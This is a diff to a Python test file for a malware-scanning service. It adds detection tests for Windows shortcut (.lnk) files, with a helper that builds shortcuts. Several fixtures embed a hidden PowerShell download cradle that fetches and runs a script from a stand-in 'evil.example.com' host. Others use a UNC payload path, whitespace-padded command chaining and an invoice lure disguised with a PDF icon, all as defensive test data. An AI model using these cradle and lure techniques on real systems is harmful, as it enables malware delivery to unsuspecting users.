@@ -67,6 +67,7 @@ import json
 import logging
 import os
 import quopri
+import struct
 import zipfile
 from unittest.mock import AsyncMock, MagicMock
 
@@ -759,6 +760,24 @@ class TestGetDetectedType:
 
     def test_hta_routes_to_html_not_script(self, daemon):
         assert daemon.get_detected_type("", "", "dropper.hta", b"") == "html"
+
+    def test_lnk_by_extension(self, daemon):
+        assert daemon.get_detected_type("", "", "shortcut.lnk", b"") == "lnk"
+
+    def test_lnk_by_mime(self, daemon):
+        assert (
+            daemon.get_detected_type("application/x-ms-shortcut", "", "", b"") == "lnk"
+        )
+
+    def test_lnk_by_magic_desc(self, daemon):
+        assert daemon.get_detected_type("", "MS Windows shortcut", "", b"") == "lnk"
+
+    def test_lnk_by_magic_bytes(self, daemon):
+        header = (
+            b"\x4c\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00"
+            b"\xc0\x00\x00\x00\x00\x00\x00\x46"
+        )
+        assert daemon.get_detected_type("", "", "", header) == "lnk"
 
 
 class TestMergeReports:
@@ -3057,6 +3076,50 @@ class TestAnalyzeArchive:
         assert member["detected_type"] == "script"
         assert "script" in member["analyzers_run"]
 
+    def test_zip_lnk_member_runs_lnk_analyzer(self, daemon):
+        lnk_data = _make_lnk(
+            target="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            arguments=(
+                "-nop -w hidden -c IEX (New-Object Net.WebClient)."
+                "DownloadString('http://evil.example.com/a.ps1')"
+            ),
+        )
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w") as z:
+            z.writestr("invoice.lnk", lnk_data)
+        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
+        assert result is not None
+        member = next(
+            item for item in result["archive_files"] if item["name"] == "invoice.lnk"
+        )
+        assert member["detected_type"] == "lnk"
+        assert "lnk" in member["analyzers_run"]
+        assert "download-cradle" in _keywords(result["analyses"])
+
+    def test_zip_lnk_member_missing_parser_uses_raw_fallback(self, daemon, monkeypatch):
+        monkeypatch.setitem(xspct.config["xspct_analyzers"]["lnk"], "enabled", True)
+        monkeypatch.setattr(xspct, "HAS_LNKPARSE", False)
+        monkeypatch.setattr(
+            daemon, "extract_text_preview", MagicMock(return_value="raw fallback")
+        )
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w") as z:
+            z.writestr(
+                "invoice.lnk",
+                _make_lnk(target="C:\\Windows\\System32\\cmd.exe"),
+            )
+
+        result = daemon.analyze_archive("s", "test.zip", buf.getvalue(), 0)
+
+        member = next(
+            item for item in result["archive_files"] if item["name"] == "invoice.lnk"
+        )
+        assert "lnk" in member["analyzers_run"]
+        assert any(
+            segment["source"] == "lnk" and segment["text"] == "raw fallback"
+            for segment in result["text_segments"]
+        )
+
     def test_size_limit_stops_extraction(self, daemon):
         buf = io.BytesIO()
         big_content = b"A" * 1000
@@ -4147,6 +4210,254 @@ eval(unescape("foo"))
 
 
 # ===========================================================================
+# UNIT TESTS — analyze_lnk (Windows shortcut / .lnk)
+# ===========================================================================
+
+
+def _make_lnk(
+    target="", arguments="", working_dir="", icon_location="", description=""
+):
+    """Build a minimal, valid Windows shortcut (.lnk) file for testing.
+
+    Only the ShellLinkHeader + StringData sections are populated (no
+    LinkTargetIDList, no LinkInfo) — sufficient for LnkParse3 to expose
+    relative_path()/command_line_arguments()/working_directory()/
+    icon_location()/description() via `string_data`.
+    """
+    flags = 0x80  # IsUnicode
+    if description:
+        flags |= 0x04  # HasName
+    if target:
+        flags |= 0x08  # HasRelativePath
+    if working_dir:
+        flags |= 0x10  # HasWorkingDir
+    if arguments:
+        flags |= 0x20  # HasArguments
+    if icon_location:
+        flags |= 0x40  # HasIconLocation
+
+    clsid = bytes(
+        [
+            0x01,
+            0x14,
+            0x02,
+            0x00,
+            0x00,
+            0x00,
+            0x00,
+            0x00,
+            0xC0,
+            0x00,
+            0x00,
+            0x00,
+            0x00,
+            0x00,
+            0x00,
+            0x46,
+        ]
+    )
+    header = struct.pack("<I", 76) + clsid
+    header += struct.pack("<I", flags)
+    header += struct.pack("<I", 0x20)  # FILE_ATTRIBUTE_ARCHIVE
+    header += b"\x00" * 8 * 3  # creation/access/write FILETIMEs
+    header += struct.pack("<I", 0)  # target file size
+    header += struct.pack("<i", 0)  # icon index
+    header += struct.pack("<I", 1)  # show command (SW_SHOWNORMAL)
+    header += b"\x00" * 2  # hotkey
+    header += b"\x00" * 2  # reserved1
+    header += b"\x00" * 4  # reserved2
+    header += b"\x00" * 4  # reserved3
+    assert len(header) == 76
+
+    def _sd(s, limit=False):
+        count = min(len(s), 260) if limit else len(s)
+        return struct.pack("<H", count) + s[:count].encode("utf-16-le")
+
+    body = b""
+    if description:
+        body += _sd(description, limit=True)
+    if target:
+        body += _sd(target, limit=True)
+    if working_dir:
+        body += _sd(working_dir, limit=True)
+    if arguments:
+        body += _sd(arguments)
+    if icon_location:
+        body += _sd(icon_location)
+
+    return header + body + b"\x00\x00\x00\x00"  # empty terminal ExtraData block
+
+
+class TestAnalyzeLnk:
+    def test_empty_bytes_returns_none(self, daemon):
+        assert daemon.analyze_lnk(b"", "empty.lnk") is None
+
+    def test_missing_lnkparse3_returns_none(self, daemon, monkeypatch):
+        monkeypatch.setattr(xspct, "HAS_LNKPARSE", False)
+        data = _make_lnk(target="C:\\Windows\\System32\\cmd.exe")
+        assert daemon.analyze_lnk(data, "shortcut.lnk") is None
+
+    def test_sync_missing_parser_uses_raw_fallback(self, daemon, monkeypatch):
+        monkeypatch.setitem(xspct.config["xspct_analyzers"]["lnk"], "enabled", True)
+        monkeypatch.setattr(xspct, "HAS_LNKPARSE", False)
+        fallback = MagicMock(return_value="raw fallback")
+        monkeypatch.setattr(daemon, "extract_text_preview", fallback)
+
+        result = daemon.sync_analyze(
+            "test",
+            "run.lnk",
+            _make_lnk(target="C:\\Windows\\System32\\cmd.exe"),
+            "application/x-ms-shortcut",
+            types_to_run=["lnk"],
+        )
+
+        fallback.assert_called_once()
+        assert any(
+            segment["source"] == "lnk" and segment["text"] == "raw fallback"
+            for segment in result["text_preview"]
+        )
+
+    def test_sync_disabled_skips_analysis_and_fallback(self, daemon, monkeypatch):
+        monkeypatch.setitem(xspct.config["xspct_analyzers"]["lnk"], "enabled", False)
+        fallback = MagicMock(return_value="raw fallback")
+        monkeypatch.setattr(daemon, "extract_text_preview", fallback)
+
+        result = daemon.sync_analyze(
+            "test",
+            "run.lnk",
+            _make_lnk(target="C:\\Windows\\System32\\cmd.exe"),
+            "application/x-ms-shortcut",
+            types_to_run=["lnk"],
+        )
+
+        fallback.assert_not_called()
+        assert result["text_preview"] == []
+
+    def test_corrupt_lnk_reports_parse_error(self, daemon):
+        result = daemon.analyze_lnk(b"not a valid lnk file", "bad.lnk")
+        assert result is not None
+        assert "lnk-parse-failed" in _keywords(result["analyses"])
+
+    def test_powershell_lolbin_and_download_cradle_detected(self, daemon):
+        data = _make_lnk(
+            target="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            arguments=(
+                "-nop -w hidden -c IEX (New-Object Net.WebClient)."
+                "DownloadString('http://evil.example.com/a.ps1')"
+            ),
+        )
+        result = daemon.analyze_lnk(data, "invoice.lnk")
+        kws = _keywords(result["analyses"])
+        assert "lnk-lolbin-target" in kws
+        assert "download-cradle" in kws
+        assert "http://evil.example.com/a.ps1" in result["iocs"]["urls"]
+
+    def test_text_segment_source_is_lnk(self, daemon):
+        data = _make_lnk(target="C:\\Windows\\System32\\cmd.exe", arguments="/c whoami")
+        result = daemon.analyze_lnk(data, "run.lnk")
+        sources = {s["source"] for s in result["text_segments"]}
+        assert "lnk" in sources
+
+    def test_long_arguments_flagged(self, daemon):
+        padded = "cmd.exe /c " + "A" * 300
+        data = _make_lnk(target="C:\\Windows\\System32\\cmd.exe", arguments=padded)
+        result = daemon.analyze_lnk(data, "run.lnk")
+        assert "long-command-line" in _keywords(result["analyses"])
+
+    def test_whitespace_padding_flagged(self, daemon):
+        padded = "cmd.exe /c whoami" + " " * 30 + "&calc.exe"
+        data = _make_lnk(target="C:\\Windows\\System32\\cmd.exe", arguments=padded)
+        result = daemon.analyze_lnk(data, "run.lnk")
+        assert "whitespace-padding" in _keywords(result["analyses"])
+
+    def test_unc_target_flagged(self, daemon):
+        data = _make_lnk(target=r"\\evil-server\share\payload.exe")
+        result = daemon.analyze_lnk(data, "run.lnk")
+        assert "unc-path" in _keywords(result["analyses"])
+
+    def test_local_link_info_appends_common_suffix(self, daemon, monkeypatch):
+        string_data = MagicMock()
+        string_data.relative_path.return_value = r"C:\ignored\benign.txt"
+        string_data.command_line_arguments.return_value = "/c whoami"
+        string_data.working_directory.return_value = r"C:\Windows\System32"
+        string_data.icon_location.return_value = ""
+        info = MagicMock()
+        info.location.return_value = "Local"
+        info.local_base_path_unicode.return_value = r"C:\Windows"
+        info.common_path_suffix_unicode.return_value = r"System32\cmd.exe"
+        parsed = MagicMock(string_data=string_data, info=info)
+        monkeypatch.setattr(xspct, "_LnkFile", lambda **kwargs: parsed)
+
+        result = daemon.analyze_lnk(b"lnk", "run.lnk")
+
+        assert "lnk-lolbin-target" in _keywords(result["analyses"])
+        command = next(
+            segment["text"]
+            for segment in result["text_segments"]
+            if segment["source"] == "lnk"
+        )
+        assert r"C:\Windows\System32\cmd.exe" in command
+        assert any(
+            segment["source"] == "lnk-working-directory"
+            for segment in result["text_segments"]
+        )
+
+    def test_unicode_network_link_info_appends_common_suffix(self, daemon, monkeypatch):
+        string_data = MagicMock()
+        string_data.relative_path.return_value = ""
+        string_data.command_line_arguments.return_value = ""
+        string_data.working_directory.return_value = ""
+        string_data.icon_location.return_value = ""
+        info = MagicMock()
+        info.location.return_value = "Network"
+        info.net_name_unicode.return_value = r"\\server\share"
+        info.common_path_suffix_unicode.return_value = "payload.exe"
+        parsed = MagicMock(string_data=string_data, info=info)
+        monkeypatch.setattr(xspct, "_LnkFile", lambda **kwargs: parsed)
+
+        result = daemon.analyze_lnk(b"lnk", "run.lnk")
+
+        assert "unc-path" in _keywords(result["analyses"])
+        command = next(
+            segment["text"]
+            for segment in result["text_segments"]
+            if segment["source"] == "lnk"
+        )
+        assert command == r"\\server\share\payload.exe"
+
+    def test_icon_target_mismatch_flagged(self, daemon):
+        data = _make_lnk(
+            target="C:\\Users\\victim\\Downloads\\invoice.exe",
+            icon_location="C:\\Users\\victim\\Documents\\invoice.pdf",
+        )
+        result = daemon.analyze_lnk(data, "invoice.lnk")
+        assert "icon-target-mismatch" in _keywords(result["analyses"])
+
+    @pytest.mark.parametrize(
+        "icon_location",
+        (
+            "C:\\Windows\\System32\\imageres.dll,-102",
+            "C:\\Program Files\\Example\\example.ico",
+        ),
+    )
+    def test_normal_icon_location_not_flagged(self, daemon, icon_location):
+        data = _make_lnk(
+            target="C:\\Program Files\\Example\\example.exe",
+            icon_location=icon_location,
+        )
+        result = daemon.analyze_lnk(data, "example.lnk")
+        assert "icon-target-mismatch" not in _keywords(result["analyses"])
+
+    def test_benign_shortcut_has_no_findings(self, daemon):
+        data = _make_lnk(
+            target="C:\\Program Files\\Notepad++\\notepad++.exe",
+            working_dir="C:\\Program Files\\Notepad++",
+        )
+        result = daemon.analyze_lnk(data, "notepad.lnk")
+        assert result["analyses"] == []
+
+
+# ===========================================================================
 # UNIT TESTS — HTA-specific detection inside analyze_html
 # ===========================================================================
 
@@ -4316,6 +4627,70 @@ class TestScriptTypePipeline:
             assert resp.status == 200
         finally:
             xspct.config["xspct_analyzers"]["script"]["enabled"] = saved
+
+
+class TestLnkTypePipeline:
+    @pytest.mark.asyncio
+    async def test_lnk_file_detected_and_analysed(self, client):
+        payload = _make_lnk(
+            target="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            arguments=(
+                "-nop -w hidden -c IEX (New-Object Net.WebClient)."
+                "DownloadString('http://evil.example.com/a.ps1')"
+            ),
+        )
+        resp = await client.post(
+            "/v1/scan?filename=invoice.lnk",
+            data=payload,
+            headers={"Content-Type": "application/octet-stream"},
+        )
+        assert resp.status == 200
+        body = await resp.json()
+        assert body["file"]["type"] == "lnk"
+        findings = {f["keyword"] for f in body.get("findings", [])}
+        assert "lnk-lolbin-target" in findings
+        assert "download-cradle" in findings
+
+    @pytest.mark.asyncio
+    async def test_lnk_analyzer_disabled_skips_analysis_and_fallback(
+        self, daemon, monkeypatch
+    ):
+        monkeypatch.setitem(xspct.config["xspct_analyzers"]["lnk"], "enabled", False)
+        fallback = MagicMock(return_value="raw fallback")
+        monkeypatch.setattr(daemon, "extract_text_preview", fallback)
+
+        partial = await daemon.analyze_pipeline(
+            "test",
+            "run.lnk",
+            _make_lnk(target="C:\\Windows\\System32\\cmd.exe"),
+            "application/x-ms-shortcut",
+            types_to_run=["lnk"],
+        )
+
+        assert "lnk" not in partial.report["analyzers_completed"]
+        assert partial.report["text_preview"] == []
+        fallback.assert_not_called()
+
+    @pytest.mark.asyncio
+    async def test_lnk_missing_parser_uses_raw_fallback(self, daemon, monkeypatch):
+        monkeypatch.setitem(xspct.config["xspct_analyzers"]["lnk"], "enabled", True)
+        monkeypatch.setattr(xspct, "HAS_LNKPARSE", False)
+        fallback = MagicMock(return_value="raw fallback")
+        monkeypatch.setattr(daemon, "extract_text_preview", fallback)
+
+        partial = await daemon.analyze_pipeline(
+            "test",
+            "run.lnk",
+            _make_lnk(target="C:\\Windows\\System32\\cmd.exe"),
+            "application/x-ms-shortcut",
+            types_to_run=["lnk"],
+        )
+
+        fallback.assert_called_once()
+        assert any(
+            segment["source"] == "lnk" and segment["text"] == "raw fallback"
+            for segment in partial.report["text_preview"]
+        )
 
 
 # ===========================================================================
@@ -5132,6 +5507,7 @@ class TestCapabilities:
             "archive",
             "text",
             "script",
+            "lnk",
             "javascript",
             "iocs",
             "yara",
